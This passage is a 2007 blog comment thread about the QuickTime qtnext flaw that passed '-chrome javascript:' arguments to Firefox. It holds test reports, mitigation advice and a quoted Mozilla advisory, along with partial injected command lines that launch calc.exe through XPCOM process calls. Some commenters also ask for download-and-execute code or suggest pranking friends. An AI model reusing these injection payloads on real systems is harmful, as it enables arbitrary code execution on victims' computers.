+		<p>Well I&#8217;ve just tried it in a VMWare XP machine, with both firefox, IE7 and Opera clean installs. The exploit started calc.exe on all platforms. Very worrying.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-48837">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/7de10a19304d9088d2035815491a063c?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Xinstict</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48837">
+			September 13, 2007 at 5:43 pm</a>		</div>
+
+		<p>To exploit this on IE, firefox must be installed too. IE spawns </p>
+<pre><code>x:\program files\mozilla firefox\firefox.exe -chrome javascript:file=Components.classes...</code></pre>
+<p>like all other browsers do [K-Meleon,Opera..]</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-48839">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/3c5103f613c394651ced1e7b48eaa66b?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Sp0oKeR</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48839">
+			September 13, 2007 at 5:57 pm</a>		</div>
+
+		<p>Awsome Job!!!! Actually it&#8217;s easy to exploit this stuffs =)!!</p>
+<p>Regards</p>
+<p>Sp0oKeR</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-48845">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/6a5671ad0f4e36c1f0e2a7cf95404dbf?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.eracc.com/' rel='external nofollow' class='url'>eracc</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48845">
+			September 13, 2007 at 6:43 pm</a>		</div>
+
+		<p>Looks to me like this is a Microsoft Windows only problem (yet again). Firefox 2.0.0.6 with various Quicktime players on Linux does not do anything. Maybe you should try to do something that is Linux specific here. Of course the bottom line is only the truly ignorant (sadly this means many Microsoft Windows users) and morons browse the net as an administrator user.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-48895">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/10248a415c653d66e26294b19e755098?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.vodoo.ro/' rel='external nofollow' class='url'>Chitiga Georges</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48895">
+			September 13, 2007 at 10:43 pm</a>		</div>
+
+		<p>I`ve tested the exploit and works on firefox and ie6, on ie7 i get a &#8220;error on page&#8221;</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-48936">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0d482a1f7c165c4722f979f89c43303d?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Bk</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48936">
+			September 14, 2007 at 1:13 am</a>		</div>
+
+		<p>so short of uninstalling QT, what can users do to protect themselves from this particular sploit?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-48951">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-48951">
+			September 14, 2007 at 1:46 am</a>		</div>
+
+		<p>I would recommend to install NoScript if you are a Firefox user and switch to Firefox with NoScript if you use any other browser. When a fix is available, restore your settings.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-49009">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/14e130d1e371233d0e979319fce65b1f?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">ntbnnt</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-49009">
+			September 14, 2007 at 10:52 am</a>		</div>
+
+		<p>hmmm&#8230; doesn&#8217;t work on my linux or windows boxes&#8230; i tried running the tests here with latest stable firefox and quicktime&#8230;</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-49026">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/6a6c19fea4a3676970167ce51f39e6ee?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">0ole</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-49026">
+			September 14, 2007 at 12:14 pm</a>		</div>
+
+		<p>Same here <b>ntbnnt</b>. Doesn&#8217;t works on Mac too.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-49058">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/9f1c85478669971b274699c26e6211fe?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">BC</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-49058">
+			September 14, 2007 at 2:20 pm</a>		</div>
+
+		<p>It works here, it is quite intresting. Notepad Calculator Paint&#8230;shell.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-49121">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/80d7b8935b953dabd63268177b7981f6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Ronald</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-49121">
+			September 14, 2007 at 6:18 pm</a>		</div>
+
+		<p>Good find PDP, very nice research. I was aiming at the same stuff in my new BrowserFry platform, aiming to be an aid in this kind of research.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-49129">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/d26ffa8dde6cc82ccb805e2a20a4978c?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">anon</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-49129">
+			September 14, 2007 at 6:42 pm</a>		</div>
+
+		<p>tee hee&#8230;  all your demo links just open up an &#8220;Enter name of file to save to&#8221; dialog box for me :-p</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-49160">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/4adcca49b3b1e5a08ac202f5d5a9e688?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">random</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-49160">
+			September 14, 2007 at 9:23 pm</a>		</div>
+
+		<p>This isnt fair to us linux users. I tried to get all of your links to work but they just failed. Mplayer&#8217;s plugin wouldnt let it through and then apparmor wont allow firefox to execute any applications. Any one have any suggestions? I have firefox&#8230;</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-49219">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/b67018e63cb9ed080909df71816f389e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Nukes</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-49219">
+			September 15, 2007 at 2:00 am</a>		</div>
+
+		<p>Did this Exploit works in QuickTime 7.2?</p>
+<p>I have tested it here and didn&#8217;t work :(.</p>
+<p>see ya</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-49222">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/14e130d1e371233d0e979319fce65b1f?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">ntbnnt</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-49222">
+			September 15, 2007 at 2:09 am</a>		</div>
+
+		<p>Well, I am getting to a quicktime plugin prompt, the little media bar and of course play does absolutely nothing. very strange, not quite sure what the difference in the boxes that do it and the boxes that don&#8217;t&#8230;. pdp, any ideas about what hardware/additional software would make one more vunerable&#8230; I&#8217;ll keep looking into this&#8230;</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-49313">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/3840755d12928ec3c4b20fc97d781e50?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">2rzn</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-49313">
+			September 15, 2007 at 11:50 am</a>		</div>
+
+		<p>Did not work here. My firefox runs under Xp, and its configured to automatically ask to download files like mp3, mov, avi etc. Its not allowed to automatically launch the player. Seems that that avoids the problem.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-49494">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/3d77b9db9a47b22398e737207418ab27?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Snap</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-49494">
+			September 16, 2007 at 1:33 am</a>		</div>
+
+		<p>it doesnt work here </p>
+<p>i have tried in FF and IE with the last version of QuickTime</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-49594">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5600af6e23670f47d71e95712bc2d390?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">grigs</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-49594">
+			September 16, 2007 at 11:44 am</a>		</div>
+
+		<p>how is it possible to pass multiple parameters to the cmd? Or does someone know where to reade about the xml file.. how it is structured and what way you can wright to the CMD ?<br />
+thanks grigs</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-49897">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/3845a2ae838c1652841ea1000b85775f?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">hnZ^</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-49897">
+			September 17, 2007 at 5:37 pm</a>		</div>
+
+		<pre><code>process.run(true,['/parmaeter1'],['/parameter2'],2) (2=arg lenght)</code></pre>
+<p>and use some utf8 encoder if you have long parameters. I still havent managed to get this to write a .bat.</p>
+<pre><code>process.run(true,['/c &gt; script.txt echo hello'],1)</code></pre>
+<p>didn&#8217;t work as supposed. I also tried the javascript used by pocs for the old firelinking bug (<a href="http://www.mikx.de/firelinking/" rel="nofollow">http://www.mikx.de/firelinking/</a>), but I didn&#8217;t get that to work neither.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-50060">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0885eeac949e9492e901de4fcf06483f?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Brandon</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-50060">
+			September 18, 2007 at 3:17 am</a>		</div>
+
+		<p>All these do are throw an error and then open IE, here, the lot of them.  FireFox 2.0.0.6, QuickTime 7.2.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-50268">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/dcb5ed7d46e58ee7652c00926449033e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">l.phoenix</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-50268">
+			September 18, 2007 at 6:05 pm</a>		</div>
+
+		<p>I think this vulnerability could be used for install trojan and backdoor. It simplify does this by attach a binary file with javascript code, write it to local file and exec it. </p>
+<p>So be aware with every media link you click on FF until Mozilla fixes it on FF 2.0.0.7!</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-50270">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/023978f851b7cfee4379e2b1ac24039a?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Josh Davis</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-50270">
+			September 18, 2007 at 6:12 pm</a>		</div>
+
+		<p>I really wished that would have worked. Apparently I need quicktime and Windows for this to work? I clicked all the links and my BSD box failed to shutdown or do anything remotely cool. </p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-50299">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/acddaf0d543dd3dcf47a46124d5eda75?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">ramo</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-50299">
+			September 18, 2007 at 7:58 pm</a>		</div>
+
+		<p>doesn&#8217;t work, although a dll athenticator noted that a new connection locally intiated is attempting to connectto some unknown website.</p>
+<p>anywho, doesn&#8217;t work</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-50323">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/02d91ef455d3a542e9e4eba5fd12d23f?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">wilfred</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-50323">
+			September 18, 2007 at 9:47 pm</a>		</div>
+
+		<p>no problems @ ubuntu linux :-)</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-50359">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5c4f68132e344371b8ec9545ced719ee?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">joe</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-50359">
+			September 18, 2007 at 11:46 pm</a>		</div>
+
+		<p>yay firefox 2.0.0.7 has been released! I feel safe again :)</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-50401">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/41585298147721d7fca0ec83a07b1987?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">AH</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-50401">
+			September 19, 2007 at 1:29 am</a>		</div>
+
+		<p>Haha, Firefox 2.0.0.7 out that now blocks the -chrome exploit.  You never see that kind of turnaround with Microsoft.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-50405">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/fcb77402dd3b96f2ff68274a8f637575?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.blockfirefox.com/' rel='external nofollow' class='url'>Jake Casper</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-50405">
+			September 19, 2007 at 1:59 am</a>		</div>
+
+		<p>This is too many critical alerts in 1 year.  I see from the comments here IE isn&#8217;t affected.  Time to make the switch back to what works people.</p>
+<p>Jake</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-50538">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c5e29912847931f7f8495ef51b7a5521?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://blog.kaizeku.com/' rel='external nofollow' class='url'>chaoskaizer</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-50538">
+			September 19, 2007 at 7:36 pm</a>		</div>
+
+		<p>thanks for the news, this is one of the most hostile  Firefox vulnerabilities.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-50561">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c19e58e6cab0ec47a5c4e37086ce796c?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.soundclick.com/danielortiz' rel='external nofollow' class='url'>danieru</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-50561">
+			September 19, 2007 at 9:35 pm</a>		</div>
+
+		<p>wow, incredible finding, pdp!</p>
+<p>tested bug on the following:</p>
+<p>Mozilla/5.0 (Windows; U; Windows NT 6.0; es-AR; rv:1.8.1.7) Gecko/20070914 Firefox/2.0.0.7 NoScript 1.1.7.2</p>
+<p>&#8230;did not work, i&#8217;m on vista64. it still does recognize the script call tho, but it kinda does not find it lulz. all it says: &#8220;cannot find &#8216;allwholecommandline&#8217;. please verify the web or local path are correct&#8221;</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-50572">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-50572">
+			September 19, 2007 at 10:35 pm</a>		</div>
+
+		<p>danieru, interesting!!!</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-50581">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/7de10a19304d9088d2035815491a063c?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Xinstict</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-50581">
+			September 19, 2007 at 11:22 pm</a>		</div>
+
+		<p>here is code.exec example since this vuln. is patched now..</p>
+<p>This example connects to local ftp with username x and pass x, downloads t.exe and executes it.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-50596">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/dff3b6d066387a63049874c6a3c71223?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Chris</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-50596">
+			September 20, 2007 at 1:34 am</a>		</div>
+
+		<p>My 2.0.0.7 crashes opening qt-poc-02-shutdown-dont-click.mp3&#8230;</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-50664">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/10c7368037d36bcc17a076d8bfc15878?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Red</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-50664">
+			September 20, 2007 at 5:44 am</a>		</div>
+
+		<p>LOL danieru!</p>
+<p>The firefox 2.0.0.7 that you have installed (im sure it was approx. on the 19th of september) IS issued to close the QT hole!!!!</p>
+<p>No matter if it`s vista64 or not!</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-50669">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/67c31d8ff56a3f6ebe2bb5d551fceeec?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">yksoft1</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-50669">
+			September 20, 2007 at 5:55 am</a>		</div>
+
+		<p>Seems Firefox 1.5.0.11 is affected but just pop a messagebox that says IE cannot find URL &#8220;Components.classes['@mozilla.org/file/local;1'].createInstance(Components.interfaces.nsILocalFile);file.initWithPath(&#8216;c:\\windows\\system32\\calc.exe&#8217;);process=Components.classes[&#8216;@mozilla.org/process/util;1&#8243;</p>
+<p>and a blank IE Window popped out.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-50718">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/4550629aa60f7ef68d07db76ff7244ec?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://larholm.com/' rel='external nofollow' class='url'>Thor Larholm</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-50718">
+			September 20, 2007 at 10:21 am</a>		</div>
+
+		<p>Firefox 2.0.0.7 takes care of this attack vector, so here are some notes about using qtnext with Internet Explorer:</p>
+<p><a href="http://larholm.com/2007/09/19/quicktime-qtnext-0day-for-ie/" rel="nofollow">http://larholm.com/2007/09/19/.....ay-for-ie/</a></p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-51080">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/cd6ae85553c5d0155b8b0f417b9fb5db?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://sumguy.com/' rel='external nofollow' class='url'>SUMGUY</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-51080">
+			September 21, 2007 at 9:33 am</a>		</div>
+
+		<p>What is the Remote File Download &amp; Execute code for this Exploit..??</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-51208">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/85c486b8766f349290ee2f98213e0f00?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">NonCents</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-51208">
+			September 21, 2007 at 4:54 pm</a>		</div>
+
+		<p>This is a beautiful little hack, and used in conjunction with another &#8211; <a href="http://www.metacafe.com/watch/705792/windows_dirty_trick/" rel="nofollow">http://www.metacafe.com/watch/.....rty_trick/</a> you can absolutely torture anyone&#8230; Do this to a friend to make, whatever you want happen whenever they visit&#8230; any site (if your truly evil set it to their home page)</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-51220">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/09c87c395e5df2231b47a989dd19acc5?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Marcello</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-51220">
+			September 21, 2007 at 5:22 pm</a>		</div>
+
+		<p>Windows 2000 SP4 (5.00.2195)<br />
+Firefox 2.0.0.7<br />
+QuickTime player 7.1.6</p>
+<p>Clicking on any of the supposed exploit-link I obtain a new Firefox window, and the javascript error console shows something like this:</p>
+<p>Error: uncaught exception: [Exception... "Component returned failure code: 0x80004005 (NS_ERROR_FAILURE) [nsIStringBundle.GetStringFromName]&#8221;  nsresult: &#8220;0&#215;80004005 (NS_ERROR_FAILURE)&#8221;  location: &#8220;JS frame :: <a href='chrome://vrs/content/vrsOverlay.js' rel='nofollow'>chrome://vrs/content/vrsOverlay.js</a> ::  :: line 55&#8243;  data: no]</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-51539">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5f302c596238631a8fb4844a94faf7ab?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Andreas</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-51539">
+			September 22, 2007 at 1:07 pm</a>		</div>
+
+		<p>Firefox 2.0.0.7 has fixed this issue specifically: (excerpt from the problem report at <a href="http://www.mozilla.org/security/announce/2007/mfsa2007-28.html" rel="nofollow">http://www.mozilla.org/securit.....07-28.html</a>)</p>
+<p>&#8220;On his blog Petko D. Petkov reported that QuickTime Media-Link files contain a qtnext attribute that could be used on Windows systems to launch the default browser with arbitrary command-line options. When the default browser is Firefox 2.0.0.6 or earlier use of the -chrome option allowed a remote attacker to run script commands with the full privileges of the user. This could be used to install malware, steal local data, or otherwise corrupt the victim&#8217;s computer.&#8221;<br />
+[...]<br />
+&#8220;To protect Firefox users from this problem we have now eliminated the ability to run arbitrary script from the command-line. Other command-line options remain, however, and QuickTime Media-link files could still be used to annoy users with popup windows and dialogs until this issue is fixed in QuickTime.</p>
+<p>This QuickTime issue appears to be the one described by CVE-2006-4965 but the fix Apple applied in QuickTime 7.1.5 does not prevent this version of the problem.&#8221;</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-51595">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5c130acf7891e4093f0bebed57603702?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Ano20070922</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-51595">
+			September 22, 2007 at 10:42 pm</a>		</div>
+
+		<p>Notes to several other comment posters:</p>
+<p>1. This exploit only works if Firefox is the default browser.  It doesn&#8217;t matter what browser you use, only the default browser matters for this one.</p>
+<p>2. The example exploits on this page use the security hole to launch some programs that are part of Windows.  To test the exploits on Mac, Linux, BSD etc. you would need to change those strings in the exploits to name programs from those systems.</p>
+<p>3. Firefox 2.0.0.7 removed the command line option used by these exploits.</p>
+<p>4. The real issue is that when QuickTime sees a URL inside a movie or song, it passes the url text to the command line of whatever is the default browser in a way which allows passing arbitrary text to the browser command line.  In the old Firefox 2.0.0.6 browser this allowed access to the -chrome option.  But any browser whose command line parser can be tricked into doing dangerous stuff from nonsense URLs can be exploited.</p>
+<p>5. Firefox 2.0.0.7 is just a stopgap workaround for the specific exploits on this page.  The real issue is that the generic &#8220;open default browser&#8221; action in the operating system and class libraries needs to ensure that whatever is passed on to the browser process is a single argument which does not look like an option or contains spaces or shell metacharacters.  I don&#8217;t have the Quicktime source code, so I don&#8217;t know which interface they use to pass the qtnext string to the browser.  But I am certain that the strings found in the exploits should not have made it through the kind of basic security sanitation filters recommended in GNU/UNIX secure programming tutorials for decades.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-51710">
+				<div class="comment-author vcard">
